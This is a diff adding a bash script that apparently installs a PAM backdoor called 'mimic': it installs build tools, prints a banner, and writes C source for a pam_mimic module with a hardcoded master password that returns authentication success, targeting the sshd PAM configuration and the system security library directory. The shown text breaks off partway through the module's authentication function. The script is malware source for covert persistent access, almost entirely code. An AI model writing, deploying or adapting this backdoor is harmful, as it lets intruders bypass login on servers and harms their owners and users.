@@ -1,0 +1,100 @@
+#!/bin/bash
+
+# Variables
+MASTER_PASSWORD="mimic"
+MODULE_NAME="pam_mimic"
+MODULE_FILE="${MODULE_NAME}.c"
+SO_FILE="/lib/x86_64-linux-gnu/security/${MODULE_NAME}.so"
+PAM_SSHD_CONF="/etc/pam.d/sshd"
+
+# Function to display the ASCII art banner
+display_banner() {
+    clear
+    echo "        .__        .__        "
+    echo "  _____ |__| _____ |__| ____  "
+    echo " /     \\|  |/     \\|  |/ ___\\ "
+    echo "|  Y Y  \\  |  Y Y  \\  \\  \\___ "
+    echo "|__|_|  /__|__|_|  /__|\\___  >"
+    echo "      \\/         \\/        \\/ "
+    echo "                             "
+    echo "    https://github.com/rek7/mimic/"
+    echo ""
+    echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿"
+    echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⢀⣿⣿⣿"
+    echo "⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠛⣿⠶⣮⣿⣟⠛⠛⠛⠛⠛⣿⣿⣥⡶⣿⢿⣿⣿⣿"
+    echo "⣿⠟⠋⠉⠉⣹⡿⠷⢶⣤⣿⣶⣿⣬⣭⣦⣤⣤⣤⣼⣭⣭⣿⣶⣟⣀⣙⣿⣿"
+    echo "⣿⠇⠀⠀⢀⣴⠟⢀⣴⣿⡇⠀⣰⡇⠀⠀⣾⡄⠀⣼⣷⡀⢀⣿⠉⠉⣿⠉⢛⣿"
+    echo "⣿⠀⠀⣠⡾⠃⣠⢾⡁⠘⣿⣴⣿⣷⡀⣸⣿⣿⣿⣿⣿⣿⣾⣿⡇⢠⣿⣦⣾⣿"
+    echo "⣿⣇⣴⠟⢀⣿⠋⢸⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿"
+    echo "⣿⣿⡏⢠⣿⡿⣿⣶⢿⣿⣿⣿⣿⣿⠏⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⣿⣿⣿⣿⣿"
+    echo "⣿⣿⣿⣿⣏⠀⢻⠋⠸⣿⠏⠸⣿⠏⠀⢸⣿⠋⢻⣿⡏⠹⣿⡏⠀⢻⡟⠈⢿⣿"
+    echo "⣿⣿⣿⠉⠉⠛⠛⠲⢶⡿⠶⣦⣿⣤⣤⣬⣯⣤⣬⣿⣤⣤⣽⣥⣤⣾⠷⠶⣾⣿"
+    echo "⣿⣿⣿⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⢸⡇⠀⣠⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⣿"
+    echo "⣿⣿⣿⣇⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢸⡇⠀⣻⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⣿"
+    echo "⣿⣿⣿⣻⣆⠀⢀⣴⣿⣦⡀⠀⠀⠀⠀⢸⡇⠀⠛⠀⢸⡇⠀⠀⠀⠀⠀⣠⣿⣿"
+    echo "⣿⣿⣿⣿⣿⣶⣿⣅⣿⠘⢷⡄⠀⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⢀⣼⠏⣿⣿"
+    echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿"
+    echo ""
+}
+
+# Install required packages
+echo "Installing required packages..."
+sudo apt-get update
+sudo apt-get install -y build-essential libpam0g-dev
+
+# Display banner
+display_banner
+
+# Create the PAM module source code
+echo "Creating PAM module source code..."
+cat <<EOF > $MODULE_FILE
+#include <security/pam_appl.h>
+#include <security/pam_modules.h>
+#include <security/pam_ext.h>
+#include <security/pam_misc.h>
+#include <string.h>
+#include <unistd.h>
+
+#define MASTER_PASSWORD "$MASTER_PASSWORD"
+
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    const char *user;
+    const char *password;
+    int pam_err;
+    struct pam_message msg;
+    const struct pam_message *msgp;
+    struct pam_response *resp;
+    struct pam_conv *conv;
+
+    // Get the user
+    pam_err = pam_get_user(pamh, &user, "Username: ");
+    if (pam_err != PAM_SUCCESS) {
+        return pam_err;
+    }
+
+    // Get the password
+    pam_err = pam_get_item(pamh, PAM_CONV, (const void **) &conv);
+    if (pam_err != PAM_SUCCESS) {
+        return pam_err;
+    }
+
+    msg.msg_style = PAM_PROMPT_ECHO_OFF;
+    msg.msg = "Password: ";
+    msgp = &msg;
+    pam_err = conv->conv(1, &msgp, &resp, conv->appdata_ptr);
+    if (pam_err != PAM_SUCCESS) {
+        return pam_err;
+    }
+
+    password = resp->resp;
+
+    // Check if the password matches the master password
+    if (strcmp(password, MASTER_PASSWORD) == 0) {
+        // Check if the user is root
+        if (strcmp(user, "root") == 0) {
+            return PAM_SUCCESS;
+        }
+
+        // Set the effective user ID to root
+        pam_err = pam_set_data(pamh, "pam_setcred", (void *)1, NULL);
+        if (pam_err != PAM_SUCCESS) {
